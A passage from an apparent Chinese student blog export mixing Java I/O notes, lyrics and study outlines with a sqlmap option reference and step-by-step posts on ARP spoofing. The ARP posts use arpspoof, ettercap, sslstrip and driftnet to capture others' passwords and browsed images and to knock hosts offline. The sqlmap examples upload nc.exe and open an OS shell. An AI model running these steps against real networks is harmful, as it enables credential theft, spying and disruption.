字节流与字符流的区别》、《理解Java中字符流与字节流的区别》、《Java:字节流和字符流（输入流和输出流）》.\n\n&nbsp;\n二、System、in、out说明Java系统自带的标准数据流：java.lang.System:\n\njava.lang.System     \npublic final class System  extends Object{     \n   static  PrintStream  err;//标准错误流（输出）、err是对象；  \n   static  InputStream  in;//标准输入(键盘输入流)、in是对象；   \n   static  PrintStream  out;//标准输出流(显示器输出流)、out是对象.\n}    \n\n🌼 System类不能创建对象，只能直接使用它的三个静态成员;🌼 每当main方法被执行时,就自动生成上述三个对象;🌼 System是java.lang包里面的一个类；🌼 in是java.io.InputStream类的对象，也是System里面的一个数据成员(也称为字段)；🌼 read()是java.io.InputStream类里的方法，也就是in对象的方法;🌼 out是java.io.PrintStream类的对象，也是System里面的一个数据成员(也称为字段)；🌼 print()、println()是java.io.PrintStream类里的方法，也就是out对象的方法;\n\n&nbsp;\n三、System.in.read()使用🌼 System.in.read()方法的作用是按每次读取一个字节（就是ASCII码），然后返回它的ASCII码十进制;🌼 从第一次打开System.in输入流开始，以后输入的字节都存放起来，下次从这个里面依次按顺序读取;🌼 用System.in.read()时，我们在键盘上按下的任何一个键都会被当做是输入值，包括Enter键也会被当做是一个值！当我们按下Enter的时候，实际上发送两个键值：一个回车\\t（13），一个是换行\\n（10）;🌼 从键盘输入一个a，char是两个字节存储的，read()一个字节一个字节读取时，暂时把a看作是一个字节，后续深入学习了再来解释😫😂（哈，貌似想通了，当字节流读到字节为0的数据流时会舍去，相当于跳过该字节继续读下一个非0的字节…..后续更新中）—-12.27与老师探讨后得知：在流中输入的字符是一个ASCII(即一个字节=8比特)，这个时候就是一个字节，而char存储的时候是按2个字节存储的，注意的是在流中并不是存储，存储一个字符是Unicode码共16位，而流中的ASCII是8位。建议去读《java总结输入流输出流》！！！可参考Scanner使用方法\n\n注意事项：\n1、由于在控制台输入时，按下回车键才代表输入完成，输入的内容才会提交到read()方法，所以按下回车之前，程序是不知道你输入了什么的;2、输入”a”后按下回车，这时候read()方法读到了数据，此时buffer中的数据应该是97 13 10，也就是字符’a’,’\\r’,’\\n’，并且read()方法每次只能从缓冲区中读出一个字符，三次read()就刚好读出这3个字符，之后程序就结束了;3、只按下回车，此时从流中只读到了”\\r”和”\\n”，由于没有足够的输入，那么第三次调用read()时阻塞.参考：《System.in.read()使用》；《System.in输入流深入理解》推荐阅读：《深入理解JAVA中的IO》\n\n&nbsp;\n四、System.out.print()/println()🌼 System.out.print()输出不换行，System.out.print()输出后换行.参考《深入理解System.out.print》.\n\n&nbsp;\n五、Java中System.out.print()函数与Python中print()函数的详解python中的print()函数和java中的System.out.print()函数都有着打印字符串的功能。(1). python中: print(“hello,world!”)输出为：hello,world!Java中: System.out.print(“hello,world!”);输出为：hello,world!说明这两个函数的用法是一样的.(2). python中: print(“1+1=”,1+1)输出结果为：1+1= 2Java中: System.out.print(“1+1=”+(1+1));输出结果为：1+1=2说明在使用print()函数的时候，我们用了一个“,”将“1+1=”和1+1的结果连接起来了，这个“,”起着连接的作用。同时，在使用System.out.print()函数的时候，我们用了一个“+”将“1+1=”和1+1的结果连接起来了，这个“+”也是起着连接作用;我们再来看他们的输出结果，print()输出的是1+1= 2，“=”与“2”之间有一个空格，而System.out.print()输出的是1+1=2，“=”与“2”之间没有空格。这里我们发现python中的print()函数中的“,”不仅起着连接字符串的作用，而且还表示一个空格.结论：🌼 python中的print()函数的作用和java中的System.out.print()函数的作用是一样的;🌼 print()函数中“,”和System.out.print()函数中“+”都有着连接字符串的作用;🌼 print()函数中“,”还表示一个空格;🌼 不同的语言都有着很多的相似点，不同的语言又有着不同的新特性.参考：《python中print()函数的“,”与java中System.out.print()函数中的“+”功能详解》.\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d0ac2faa2.jpg","plink":"https://Directoree.github.io/post/Java-IO-1/"},{"title":"SQLMAP命令大全","date":"2018-12-11T11:10:10.000Z","updated":"2018-12-24T13:59:53.051Z","content":"一、sqlmap简介&emsp;sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。\nsqlmap支持五种不同的注入模式： 🌸基于布尔的盲注，即可以根据返回页面判断条件真假的注入； 🌸基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语      句是否执行（即页面返回时间是否增加）来判断； 🌸基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中； 🌸联合查询注入，可以使用union的情况下的注入； 🌸堆查询注入，可以同时执行多条语句的执行时的注入。\n\n\n&ensp;\n二、SQL使用参数详解每条指令使用方法参见：《sqlmap注入总结》.\n2.1 选项Options-h,–help  显示基本帮助信息并退出 -hh    显示高级帮助信息并退出--version  显示程序版本信息并退出-vVERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。\n\n&nbsp;\n2.2 目标Target在这些选项中必须提供至少有一个确定目标 -d DIRECT    直接连接数据库的连接字符串-u URL, –url=URL   目标URL (e.g.”http://www.site.com/vuln.php?id=1“)，使用-u或者–url-l LOGFILE     从Burp或者WebScarab代理日志文件中分析目标-x SITEMAPURL  从远程网站地图（sitemap.xml）文件来解析目标-m BULKFILE      将目标地址保存在文件中，一行为一个URL地址进行批量检测。-r REQUESTFILE   从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443-g GOOGLEDORK     从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）-c CONFIGFILE       从配置ini文件中加载选项\n\n&nbsp;\n2.3 请求Request这些选项可以用来指定如何连接到目标URL--method=METHOD  强制使用给定的HTTP方法（例如put）    --data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data=”id=1” -f --banner --dbs --users   --param-del=PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。   --cookie=COOKIE     HTTP Cookieheader 值   --cookie-del=COO..  用来分隔cookie的字符串值   --load-cookies=L..  Filecontaining cookies in Netscape/wget format   --drop-set-cookie   IgnoreSet-Cookie header from response   --user-agent=AGENT  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取。当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入   --random-agent     使用random-agent作为HTTP User-Agent头值   --host=HOST         HTTP Hostheader value   --referer=REFERER   sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入   -H HEADER, –hea..  额外的http头(e.g.”X-Forwarded-For: 127.0.0.1″)   --headers=HEADERS  可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\\nETag: 123″)   --auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)   --auth-cred=AUTH..  HTTP 认证凭证(name:password)   --auth-file=AUTH..  HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。   --ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）   --ignore-proxy      忽略系统的默认代理设置   --ignore-redirects忽略重定向的尝试   --ignore-timeouts   忽略连接超时   --proxy=PROXY       使用代理服务器连接到目标URL   --proxy-cred=PRO..  代理认证凭证(name:password)   --proxy-file=PRO..  从文件加载代理列表   --tor               使用Tor匿名网络   --tor-port=TORPORT  设置Tor代理端口   --tor-type=TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))   --check-tor       检查Tor的是否正确使用   --delay=DELAY   可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。   --timeout=TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。   --retries=RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。   --randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样   --safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下   --safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。   --safe-req=SAFER..  从文件中加载安全HTTP请求   --safe-freq=SAFE..  测试一个给定安全网址的两个访问请求   --skip-urlencode    跳过URL的有效载荷数据编码   --csrf-token=CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌   --csrf-url=CSRFURL  URL地址访问提取anti-CSRF令牌   --force-ssl         强制使用SSL/HTTPS   --hpp               使用HTTP参数污染的方法   --eval=EVALCODE     在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”) sqlmap.py -u”http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“--eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”\n\n&nbsp;\n2.4 优化Optimization这些选项可用于优化sqlmap性能-o               打开所有的优化开关--predict-output    预测普通查询输出--keep-alive        使用持久HTTP（S）连接--null-connection   获取页面长度--threads=THREADS   当前http(s)最大请求数 (默认 1)\n\n&nbsp;\n2.5 注入Injection这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。   -p TESTPARAMETER    可测试的参数   --skip=SKIP         跳过对给定参数的测试   --skip-static       跳过测试不显示为动态的参数   --param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）   --dbms=DBMS         强制后端的DBMS为此值   --dbms-cred=DBMS..  DBMS认证凭证(user:password)   --os=OS            强制后端的DBMS操作系统为这个值   --invalid-bignum    使用大数字使值无效   --invalid-logical   使用逻辑操作使值无效   --invalid-string    使用随机字符串使值无效   --no-cast          关闭有效载荷铸造机制   --no-escape         关闭字符串逃逸机制   --prefix=PREFIX     注入payload字符串前缀   --suffix=SUFFIX     注入payload字符串后缀   --tamper=TAMPER   使用给定的脚本篡改注入数据\n\n&nbsp;\n2.6 检测Detection这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容   --level=LEVEL     执行测试的等级（1-5，默认为1）   --risk=RISK       执行测试的风险（0-3，默认为1）   --string=STRING    查询时有效时在页面匹配字符串   --not-string=NOT..  当查询求值为无效时匹配的字符串   --regexp=REGEXP     查询时有效时在页面匹配正则表达式   --code=CODE       当查询求值为True时匹配的HTTP代码   --text-only        仅基于在文本内容比较网页   --titles           仅根据他们的标题进行比较\n\n&nbsp;\n2.7 技巧Techniques这些选项可用于调整具体的SQL注入测试   --technique=TECH    SQL注入技术测试（默认BEUST）   --time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）   --union-cols=UCOLS  定列范围用于测试UNION查询注入   --union-char=UCHAR  暴力猜测列的字符数   --union-from=UFROM  SQL注入UNION查询使用的格式   --dns-domain=DNS..  DNS泄露攻击使用的域名   --second-order=S..  URL搜索产生的结果页面\n\n&nbsp;\n2.8 指纹Fingerprint-f, --fingerprint   执行广泛的DBMS版本指纹检查\n\n&nbsp;\n2.9 枚举Enumeration这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。   -a, --all           获取所有信息   -b, --banner        获取数据库管理系统的标识   --current-user      获取数据库管理系统当前用户   --current-db        获取数据库管理系统当前数据库   --hostname         获取数据库服务器的主机名称   --is-dba            检测DBMS当前用户是否DBA   --users             枚举数据库管理系统用户   --passwords         枚举数据库管理系统用户密码哈希   --privileges        枚举数据库管理系统用户的权限   --roles            枚举数据库管理系统用户的角色   --dbs             枚举数据库管理系统数据库   --tables            枚举的DBMS数据库中的表   --columns          枚举DBMS数据库表列   --schema            枚举数据库架构   --count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb   --dump            转储数据库表项   --dump-all          转储数据库所有表项   --search           搜索列（S），表（S）和/或数据库名称（S）   --comments          获取DBMS注释   -D DB               要进行枚举的指定数据库名   -T TBL              DBMS数据库表枚举   -C COL             DBMS数据库表列枚举   -X EXCLUDECOL     DBMS数据库表不进行枚举   -U USER           用来进行枚举的数据库用户   --exclude-sysdbs    枚举表时排除系统数据库   --pivot-column=P..  Pivot columnname   --where=DUMPWHERE   Use WHEREcondition while table dumping   --start=LIMITSTART  获取第一个查询输出数据位置   --stop=LIMITSTOP   获取最后查询的输出数据   --first=FIRSTCHAR   第一个查询输出字的字符获取   --last=LASTCHAR    最后查询的输出字字符获取   --sql-query=QUERY   要执行的SQL语句   --sql-shell         提示交互式SQL的shell   --sql-file=SQLFILE  要执行的SQL文件\n\n&nbsp;\n2.10 暴力Brute force这些选项可以被用来运行暴力检查   --common-tables     检查存在共同表   --common-columns    检查存在共同列\n\n&nbsp;\n2.11 用户自定义函数注入User-defined function injection这些选项可以用来创建用户自定义函数   --udf-inject    注入用户自定义函数   --shared-lib=SHLIB  共享库的本地路径\n\n&nbsp;\n2.12 访问文件系统File system access这些选项可以被用来访问后端数据库管理系统的底层文件系统   --file-read=RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe:sqlmap.py -u”http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther“\\--file-read “C:/example.exe” -v 1   --file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件   --file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下：python sqlmap.py -u”http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1” --file-write”/software/nc.exe” --file-dest “C:/WINDOWS/Temp/nc.exe” -v1\n\n&nbsp;\n2.13 操作系统访问Operating system access这些选项可以用于访问后端数据库管理系统的底层操作系统   --os-cmd=OSCMD   执行操作系统命令（OSCMD）   --os-shell          交互式的操作系统的shell   --os-pwn          获取一个OOB shell，meterpreter或VNC   --os-smbrelay       一键获取一个OOBshell，meterpreter或VNC   --os-bof           存储过程缓冲区溢出利用   --priv-esc          数据库进程用户权限提升   --msf-path=MSFPATH  MetasploitFramework本地的安装路径   --tmp-path=TMPPATH  远程临时文件目录的绝对路径linux查看当前用户命令：sqlmap.py -u”http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1” --os-cmd id -v1\n\n&nbsp;\n2.14 Windows注册表访问Windows registry access这些选项可以被用来访问后端数据库管理系统Windows注册表   --reg-read          读一个Windows注册表项值   --reg-add           写一个Windows注册表项值数据   --reg-del           删除Windows注册表键值   --reg-key=REGKEY    Windows注册表键   --reg-value=REGVAL  Windows注册表项值   --reg-data=REGDATA  Windows注册表键值数据   --reg-type=REGTYPE  Windows注册表项值类型\n\n&nbsp;\n2.15 一般选项General这些选项可以用来设置一些一般的工作参数   -s SESSIONFILE     保存和恢复检索会话文件的所有数据   -t TRAFFICFILE      记录所有HTTP流量到一个文本文件中   --batch            从不询问用户输入，使用所有默认配置。   --binary-fields=..  结果字段具有二进制值(e.g.”digest”)   --charset=CHARSET   强制字符编码   --crawl=CRAWLDEPTH  从目标URL爬行网站   --crawl-exclude=..  正则表达式从爬行页中排除   --csv-del=CSVDEL    限定使用CSV输出 (default”,”)   --dump-format=DU..  转储数据格式(CSV(default), HTML or SQLITE)   --eta              显示每个输出的预计到达时间   --flush-session     刷新当前目标的会话文件   --forms           解析和测试目标URL表单   --fresh-queries     忽略在会话文件中存储的查询结果   --hex             使用DBMS Hex函数数据检索   --output-dir=OUT..  自定义输出目录路径   --parse-errors      解析和显示响应数据库错误信息   --save=SAVECONFIG   保存选项到INI配置文件   --scope=SCOPE    从提供的代理日志中使用正则表达式过滤目标   --test-filter=TE..  选择测试的有效载荷和/或标题(e.g. ROW)   --test-skip=TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)   --update            更新sqlmap\n\n&nbsp;\n2.16 杂项Miscellaneous   -z MNEMONICS        使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)   --alert=ALERT       发现SQL注入时，运行主机操作系统命令   --answers=ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap.py -u”http://192.168.22.128/get_int.php?id=1“–technique=E\\--answers=”extending=N” --batch   --beep    发现sql注入时，发出蜂鸣声。   --cleanup     清除sqlmap注入时在DBMS中产生的udf与表。   --dependencies      Check formissing (non-core) sqlmap dependencies   --disable-coloring  默认彩色输出，禁掉彩色输出。   --gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试   --identify-waf      进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别   --mobile     有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。   --offline           Work inoffline mode (only use session data)   --purge-output     从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。   --skip-waf           跳过WAF／IPS / IDS启发式检测保护   --smart            进行积极的启发式测试，快速判断为注入的报错点进行注入   --sqlmap-shell      互动提示一个sqlmapshell   --tmp-dir=TMPDIR    用于存储临时文件的本地目录   --web-root=WEBROOT  Web服务器的文档根目录(e.g.”/var/www”)   --wizard   新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入\n\n\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d190199db.jpg","plink":"https://Directoree.github.io/post/SQLMAP-shell/"},{"title":"信息安全数学基础复习笔记","date":"2018-12-08T17:00:45.000Z","updated":"2018-12-27T06:57:04.913Z","content":"&nbsp;12.3复习笔记\n第一章、整数的可除性1.1 整数的概念、欧几里得除法&nbsp;\n1.2 最大公因数与广义欧几里得除法&nbsp;\n1.3 整除的进一步性质及最小公倍数1.4 整数分解&nbsp;\n1.5 素数的算术基本定理\n&nbsp;&nbsp;\n第二章、同余2.1 同余的概念及基本性质&nbsp;\n2.2 剩余类及完全剩余系&nbsp;\n2.3 简化剩余系与欧拉函数&nbsp;\n2.4 欧拉定理、费马小定理、Wilson定理&nbsp;\n2.5 模重复平方算法\n&nbsp;&nbsp;\n12.5复习笔记\n第三章、同余式3.1 基本概念及一次同余式&nbsp;\n3.2 中国剩余定理&nbsp;\n3.3 高次同余式的解法及解数&nbsp;\n3.4 素数模的同余式\n&nbsp;&nbsp;\n第四章、二次同余式与平方剩余4.1 一般二次同余式&nbsp;\n4.2 模为奇素数的平方剩余与平方剩余4.3 勒让得符号&nbsp;\n4.4 二次互反律4.5 雅可比符号\n&nbsp;&nbsp;\n第五章、原根与指标5.1 指数及基本性质&nbsp;\n5.2 原根&nbsp;\n5.3 指标及n次同余式&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d0fc97981.jpg","plink":"https://Directoree.github.io/post/Mathematical-basis/"},{"title":"Music-Collection","date":"2018-12-05T10:12:43.000Z","updated":"2018-12-28T10:31:40.198Z","content":"&nbsp;\n\n\n\n\n\n\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d23bc81b5.jpg","plink":"https://Directoree.github.io/post/Music-Collection/"},{"title":"PVRIS-OnlyLove","date":"2018-12-03T12:30:02.000Z","updated":"2018-12-28T01:34:16.479Z","content":"\n\nI’m hoping you weren’t heaven sent我一直祈盼你并非天赐Cause only hell knows where you’ve been鬼才知道你的行踪Your built composure’s wearing thin你佯装的镇定愈来愈单薄了And all your walls are caving in你的壁垒也渐渐塌陷Before you shut this down在你喊停之前I just wanna lift you up我只是想撑起你I’ll take all this love I found我会收藏好我拾到的爱恋And I hope that it’s enough这就够了I saw you, yeah you,我看见你了 是你you’re breaking down逐渐崩溃的你I hope you, yeah you,我希望你 是你you come around回到我身边的你Now don’t you shut this down我不准你现在喊停ooh no don’t you give this up不准你现在放手I took all this love I found我收好了我拾到的爱恋and I hope that it’s enough我多想就这样满足Is it enough?但足矣吗If we don’t bend then this might break若我们不让步 这一切都将毁灭Please don’t give into this pain求你了 不要陷入这般痛苦Just keep on counting down the days只要数着日子And dream of me to keep you safe梦着我 就让你安稳Don’t you shut this down不准你喊停No, don’t you give this up不准你放手I took all this love I found我收好了我拾到的爱恋and I hope that it’s enough我多想就这样满足I saw you, yeah you,我看见你了 是你you’re breaking down逐渐崩溃的你I hope you, yeah you,我希望你 是你you come around回到我身边的你Now don’t you shut this down我不准你现在喊停oh no don’t you give this up不准你现在放手I took all this love I found我收好了我拾到的爱恋and I hope that it’s enough我多想就这样满足Is it enough?但足矣吗Don’t you shut this down不准你喊停Don’t you give this up不准你放手Don’t you shut this down不准你喊停Don’t you give this up不准你放手Before you came around在你回来之前I was lost and out of place我失去了自我 不知所以You’re the only love I found你是我好不容易找到的挚爱and I’m hoping that you’ll stay所以我期望你能留下来Please stay所以留下来吧Please stay请你留下来吧Please stay求你留下来吧","thumbnail":"https://i.loli.net/2018/12/28/5c257cf061033.jpg","plink":"https://Directoree.github.io/post/PVRIS-OnlyLove/"},{"title":"杨宗纬-《空白格》专辑","date":"2018-12-02T16:23:55.000Z","updated":"2018-12-24T12:32:49.329Z","content":"\n\n作曲 : 蔡健雅作词 : 蔡健雅其实很简单其实很自然两个人的爱由两人分担其实并不难是你太悲观隔着一道墙不跟谁分享不想让你为难你不再需要给我个答案我想你是爱我的我猜你也舍不得但是怎么说总觉得我们之间留了太多空白格也许你不是我的爱你却又该割舍分开或许是选择但它也可能是我们的缘分我想你是爱我的我猜你也舍不得但是怎么说总觉得我们之间留了太多空白格也许你不是我的爱你却又该割舍分开或许是选择但它也可能是我们的缘分但它也可能是我们的缘分\n&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d1ee5f0a2.jpg","plink":"https://Directoree.github.io/post/杨宗纬-《空白格》专辑/"},{"title":"网络安全复习笔记","date":"2018-11-29T14:08:27.000Z","updated":"2018-12-24T14:02:09.918Z","content":"&nbsp;11.24复习笔记\n一、网络安全概述二、黑客攻击和渗透测试&nbsp;\n三、网络扫描与查点&nbsp;\n四、网络嗅探技术&nbsp;\n11.25复习笔记\n五、口令破解&nbsp;\n六、欺骗技术与防御&nbsp;\n七、Web攻击&nbsp;\n1.SQL注入&nbsp;\n2.DoS攻击、CSRF、文件包含\n八、缓冲区溢出&nbsp;\n九、防火墙&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d16052265.jpg","plink":"https://Directoree.github.io/post/Network-security/"},{"title":"算法复习笔记","date":"2018-11-28T08:50:23.000Z","updated":"2019-01-19T08:35:23.058Z","content":"&nbsp;11.19复习笔记\n二、递归与分治策略(1)递归与分治\n(2)二分搜索技术\n(3)线性时间选择、最接近点对&nbsp;&nbsp;\n11.20复习笔记\n三、动态规划(1)矩阵连乘\n(2)最长公共子序列\n(3)最长子段和、凸多边形、图像压缩\n(4)电路布线\n(5)流水作业调度、0-1背包&nbsp;&nbsp;\n11.21复习笔记\n四、贪心算法(1)活动安排、背包问题\n(2)最优装载、哈夫曼编码、单源最短路径\n(3)最小生成树\n(4)多机调度问题\n五、回溯法\n","thumbnail":"https://i.loli.net/2018/12/24/5c20cf96b08d6.jpg","plink":"https://Directoree.github.io/post/algorithm/"},{"title":"内网称霸之《HTTPS账号密码获取》","date":"2018-11-21T17:17:04.000Z","updated":"2018-12-24T12:26:37.392Z","content":"⭐使用工具：arpspoof、ettercap、sslstrip\n一、将HTTPS转换成HTTP在获取HTTPS账号、密码的操作前需要修改ettercap的设置，否则无法成功。1.先编辑/etc/ettercap/etter.conf下的文件内容，更改ettercap设置；1.1输入/etc/ettercap/etter.conf后找到：# if you use iptables:#redir_command_on = “iptables -t nat -A PREROUTING -i %iface -p tcp –dport %port -j REDIRECT –to-port %rport”#redir_command_off = “iptables -t nat -D PREROUTING -i %iface -p tcp –dport %port -j REDIRECT –to-port %rport”这个地方2.改为（去掉两个#）：# if you use iptables:redir_command_on = “iptables -t nat -A PREROUTING -i %iface -p tcp –dport %port -j REDIRECT –to-port %rport”redir_command_off = “iptables -t nat -D PREROUTING -i %iface -p tcp –dport %port -j REDIRECT –to-port %rport”3.输入sslstrip -a -f -k 实现https转换成http以获取帐号密码；4.在该终端窗口下右键选择“复制SSH渠道(S)”；5.接着直接使用HTTP账号密码获取的方法就可以了。\n\n\n\nvim使用方法：编辑：按下i；保存并退出：按下Esc，然后按Shift和：(冒号)，按下wq，完后按回车；不保存并退出：按下Esc，然后按Shift和：(冒号)，按下q!，完后按回车；\n\n\nvim /etc/ettercap/etter.conf\ni\n删除两个#\nEsc、Shift ：、wq、回车\nsslstrip -a -f -k\n\n二、ARP欺骗和抓包获取HTTPS账号和密码echo 1 >/proc/sys/net/ipv4/ip_forward\ncat /proc/sys/net/ipv4/ip_forward\narpspoof -i eth0 -t 目标IP 目标主机网关\nettercap -Tq -i eth0\n\n&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d07a0401d.jpg","plink":"https://Directoree.github.io/post/HTTPS-password/"},{"title":"内网称霸之《HTTP账号密码获取》","date":"2018-11-21T16:29:54.000Z","updated":"2018-12-24T12:25:45.567Z","content":"⭐使用工具：arpspoof、ettercap\nettercap是什么？\n\n\n我们在对WEB安全检测的时候都会用到Cain和netfuke这两款工具，功能相信用过的朋友多多少少都知道，但这两款工具是在windows下运行的。而ettercap是在linux下运行的 。其实功能都是差不多的，我称呼它为嗅探工具，ARP欺骗，DNS，劫持，中间人攻击等等。总之这是一款强大的安全测试工具。\n\n\n一、ARP欺骗echo 1 >/proc/sys/net/ipv4/ip_forward\ncat /proc/sys/net/ipv4/ip_forward\narpspoof -i eth0 -t 目标IP 目标主机网关\n\n二、使用ettercap获取HTTP账号和密码另开一个终端，输入ettercap -Tq -i eth0\nettercap -Tq -i eth0\n\n\n\n-T:文本模式q:安静模式i:指定网卡成功后当靶机浏览HTTP网页试用账号和密码登陆时，这个终端窗口就会显示相应的url、账号、密码。💛💙❤注意：当对方的用户名是使用中文登陆的，则终端窗口账号处显示的是编码，则需要使用到url解码，将这串编码解码成中文。\n\n\n&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d04409b22.jpg","plink":"https://Directoree.github.io/post/HTTP-password/"},{"title":"内网称霸之《arp欺骗获取目标主机浏览的图片》","date":"2018-11-20T16:16:05.000Z","updated":"2018-12-24T12:23:55.250Z","content":"⭐使用工具：arpspoof、driftnet&nbsp;\n一、ARP欺骗、流量转发第一步“开启ip转发”命令:echo 1 &gt;/proc/sys/net/ipv4/ip_forward        （回车没有任何的返回）第二步查看转发是否成功第三步另开窗口“开始欺骗”命令：arpspoof -i eth0 -t 192.168.1.10 192.168.1.1        （回车之后不断欺骗运行中~~~[记得这个窗口需要保留]）\n\necho 1 >/proc/sys/net/ipv4/ip_forward\ncat /proc/sys/net/ipv4/ip_forward\narpspoof -i eth0 -t 192.168.1.10 192.168.1.1\n\n二、使用driftnet获取图片命令：driftnet -i eth0（获取的图片会自动给保存，可以看它新开窗口的保存路径）“查看目标的图片信息”弹出的窗口请不要关闭，在窗口就可以看到获取信息。\n\ndriftnet -i eth0\n\n&nbsp;&nbsp;&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20cfd7456b8.jpg","plink":"https://Directoree.github.io/post/arp-picture/"},{"title":"内网称霸之《ARP欺骗断网攻击》","date":"2018-11-20T04:43:12.000Z","updated":"2018-12-24T12:23:28.197Z","content":"⭐使用工具：arpspoof\n什么是ARP?\n\n\n&emsp; ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的 低层协议，负责将某个IP地址解析成对应的MAC地址。\n\n\n什么是ARP欺骗?\n\n\n&emsp;从影响网络连接通畅的方式来看，ARP欺骗分为两种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。&emsp;第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。&emsp;实际上ARP欺骗是一种中间人攻击，攻击者通过毒化受害者的ARP缓存，将网关的MAC替换成攻击者的MAC，于是攻击者的主机实际上就充当了受害主机的网关，之后攻击者就可以截获受害者发出和接到的数据包，从中获取账号密码、银行卡信息等。\n\n\n\n\n特别提示：1、arpspoof是“Dsniff网络嗅探工具包“其中的一个工具；2、使用arpspoof前内核“IP转发”功能（或完成相同的功能程序，例如fragrouter）必须提前打开。&nbsp;\n一、ARP断网攻击用法1.先ping目标主机，ping通的主机才能欺骗；2.若是不知目标主机IP，那就先查看本机IP，比如本机是192.168.1.201；3.可以用fping -asg 192.168.1.0/24查看局域网内所有存活的主机IP，推荐查看IP列表中存  活的IP，因为有的IP不能直接给出是存活的；4.使用模板：arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host即：arpspoof -i eth0 -t 192.168.1.201 192.168.1.15.如此就能使目标主机在ARP欺骗期间处于断网状态。\n\nifconfig\nfping -asg 192.168.1.0/24\nping 192.168.1.201\narpspoof -i eth0 -t 192.168.1.201 